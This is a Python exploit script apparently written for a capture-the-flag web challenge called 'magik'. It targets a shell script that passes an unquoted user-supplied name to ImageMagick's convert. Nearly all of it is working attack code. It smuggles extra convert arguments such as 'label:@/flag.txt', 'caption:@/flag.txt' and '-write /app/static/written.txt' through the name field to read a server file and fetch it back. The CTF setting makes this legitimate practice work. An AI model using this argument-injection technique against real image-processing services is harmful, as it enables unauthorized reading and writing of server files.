#!/usr/bin/env python3
import requests
import sys
import time

URL = "https://aa1fadfd635d-magik.challs.m0lecon.it" if len(sys.argv) < 2 else sys.argv[1]

def exploit_via_name_injection():
    """
    The vulnerability: convert.sh uses unquoted $1 and $2
    convert $1 -resize 64x64 -background none -gravity center -extent 64x64 $2

    Where $2 = static/<name>.png and <name> is user-controlled!

    We can inject additional convert arguments via the name parameter
    """

    print("[*] Exploiting via name parameter injection...\n")

    # Approach 1: Inject write command to output flag to a file
    print("[1] Trying to read /flag.txt via label: protocol...")

    # Create a simple valid image file
    # 1x1 PNG
    png_bytes = bytes.fromhex('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c6300010000050001'[:100])

    # Inject via name parameter:
    # The output will be: static/<name>.png
    # We want to add: label:@/flag.txt as an input source

    # Try injecting a new input file
    payload_name = "out.png label:@/flag.txt static/flag"

    files = {'img': ('test.png', png_bytes, 'image/png')}
    data = {'name': payload_name}

    try:
        r = requests.post(URL, files=files, data=data, timeout=10)
        print(f"[+] Upload: {r.status_code}")

        time.sleep(2)

        # Try to retrieve the flag file
        for filename in ['flag.png', 'out.png', 'static/flag.png']:
            result = requests.get(f"{URL}/static/{filename}", timeout=5)
            if result.status_code == 200:
                print(f"[!] Got {filename}, size: {len(result.content)}")
                with open(filename.replace('/', '_'), 'wb') as f:
                    f.write(result.content)
                print(f"[+] Saved locally")
    except Exception as e:
        print(f"[-] Failed: {e}")

    # Approach 2: Use caption: protocol which renders text as image
    print("\n[2] Trying caption: protocol...")

    payload_name = "out.png caption:@/flag.txt static/caption"

    files = {'img': ('test.png', png_bytes, 'image/png')}
    data = {'name': payload_name}

    try:
        r = requests.post(URL, files=files, data=data, timeout=10)
        print(f"[+] Upload: {r.status_code}")

        time.sleep(2)

        result = requests.get(f"{URL}/static/caption.png", timeout=5)
        if result.status_code == 200:
            print(f"[!] Got caption.png, size: {len(result.content)}")
            with open("caption.png", 'wb') as f:
                f.write(result.content)
            print(f"[+] Saved to caption.png - this should contain the flag as text rendered in image!")
            return True

    except Exception as e:
        print(f"[-] Failed: {e}")

    # Approach 3: Write to a text file using txt: format
    print("\n[3] Trying inline:@/flag.txt...")

    payload_name = "out.png inline:@/flag.txt static/inline"

    files = {'img': ('test.png', png_bytes, 'image/png')}
    data = {'name': payload_name}

    try:
        r = requests.post(URL, files=files, data=data, timeout=10)
        print(f"[+] Upload: {r.status_code}")

        time.sleep(2)

        result = requests.get(f"{URL}/static/inline.png", timeout=5)
        if result.status_code == 200:
            print(f"[!] Got inline.png, size: {len(result.content)}")
            print(f"[!] Content preview: {result.content[:200]}")

    except Exception as e:
        print(f"[-] Failed: {e}")

    # Approach 4: Use -write option to write to additional file
    print("\n[4] Trying -write option injection...")

    # Inject: -write /app/static/written.txt
    payload_name = "x.png -write /app/static/written.txt caption:@/flag.txt static/dummy"

    files = {'img': ('test.png', png_bytes, 'image/png')}
    data = {'name': payload_name}

    try:
        r = requests.post(URL, files=files, data=data, timeout=10)
        print(f"[+] Upload: {r.status_code}")

        time.sleep(2)

        result = requests.get(f"{URL}/static/written.txt", timeout=5)
        if result.status_code == 200:
            print(f"[!] Got written.txt!")
            print(f"[!] Content: {result.text}")
            return True

    except Exception as e:
        print(f"[-] Failed: {e}")

    return False

if __name__ == "__main__":
    print(f"[*] Target: {URL}")
    print(f"[*] Vulnerability: Unquoted bash variables in convert.sh\n")
    print(f"[*] The convert command will be:")
    print(f"[*]   convert /tmp/phpXXXX -resize 64x64 -background none -gravity center -extent 64x64 static/<NAME>.png")
    print(f"[*] We control <NAME> and can inject additional arguments!\n")

    exploit_via_name_injection()

    print("\n[*] Check any downloaded PNG files - they may contain the flag rendered as text")
